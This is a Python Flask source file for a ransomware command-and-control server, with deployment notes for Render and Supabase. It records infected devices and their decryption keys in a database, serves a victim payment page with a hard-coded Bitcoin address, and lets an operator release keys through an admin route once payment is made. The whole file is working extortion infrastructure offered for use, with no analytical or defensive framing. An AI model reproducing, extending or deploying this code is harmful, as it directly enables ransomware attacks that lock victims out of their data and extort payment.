import os
from flask import Flask, render_template, request, jsonify, redirect
from random import sample
from string import ascii_letters
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURATION ---
# Uses Supabase/Postgres if DATABASE_URL is set in Render, otherwise local SQLite
db_uri = os.getenv('DATABASE_URL', 'sqlite:///devices.db')

# Fix for Render/Heroku which often provide "postgres://" instead of "postgresql://"
if db_uri.startswith("postgres://"):
    db_uri = db_uri.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_uri
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Persistent Admin Route and Bitcoin Address
ADMIN_PAGE = 'admin' 
BITCOIN_ADDRESS = 'bc1qy4hhsg7pv4cyuv7lnd8drszd233r0x2zevukvd'

# --- DATABASE MODEL ---
class Device(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), nullable=False)
    ip = db.Column(db.String(255), nullable=False)
    mac = db.Column(db.String(255), nullable=False)
    last_ping = db.Column(db.DateTime, nullable=False, default=datetime.now)
    decryption_key = db.Column(db.String(1000), nullable=False)
    is_decrypted = db.Column(db.Boolean, nullable=False, default=False)
    payment_ref = db.Column(db.String(255), nullable=False, default=lambda: ''.join(sample(ascii_letters, 10)))

# --- AUTO-INITIALIZE DATABASE ---
# This ensures the 'device' table exists before any requests are handled
with app.app_context():
    db.create_all()

# --- ROUTES ---

@app.route('/')
def home():
    """Simple landing page to prevent 404 on the root URL."""
    return "C2 Server Active."

@app.route('/<payment_ref>')
def index(payment_ref):
    """Victim payment page."""
    return render_template('victim_page.html', address=BITCOIN_ADDRESS, payment_ref=payment_ref)

@app.get(f'/{ADMIN_PAGE}')
def admin():
    """Admin dashboard with error handling for empty/uninitialized tables."""
    try:
        devices = Device.query.all()
    except Exception as e:
        print(f"[!] Database Error: {e}")
        devices = []
    return render_template('admin_page.html', devices=devices)

@app.get(f'/{ADMIN_PAGE}/set_decrypted/<payment_ref>')
def set_decrypted(payment_ref):
    """Updates the database to signal a device to begin decryption."""
    device = Device.query.filter_by(payment_ref=payment_ref).first()
    if device:
        device.is_decrypted = True
        db.session.commit()
    return redirect(f'/{ADMIN_PAGE}')

@app.post('/initial_ping')
def initial_ping():
    """Registers a new infected device and returns its unique payment reference."""
    try:
        device = Device(
                name=request.json['name'],
                ip=request.json['ip'],
                mac=request.json['mac'],
                decryption_key=request.json['decryption_key'],
            )
        db.session.add(device)
        db.session.commit()
        return jsonify({'status': 'success', 'payment_ref': device.payment_ref})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.get('/ping')
def ping():
    """Heartbeat endpoint for devices to check if they should decrypt."""
    try:
        device = Device.query.filter_by(ip=request.json['ip']).first()
        if not device:
            return jsonify({'status': 'error', 'message': 'Device not found'})
            
        device.last_ping = datetime.now()
        db.session.commit()
        
        if device.is_decrypted:
            return jsonify({
                'status': 'success', 
                'decryption_key': device.decryption_key, 
                'is_decrypted': True, 
                'mac': device.mac
            })
        else:
            return jsonify({
                'status': 'success', 
                'decryption_key': None, 
                'is_decrypted': False, 
                'mac': device.mac
            })
    except Exception:
        return jsonify({'status': 'error'})

# --- STARTUP LOGIC ---
if __name__ == '__main__':
    # Binds to 0.0.0.0 and uses the Render-assigned PORT environment variable
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
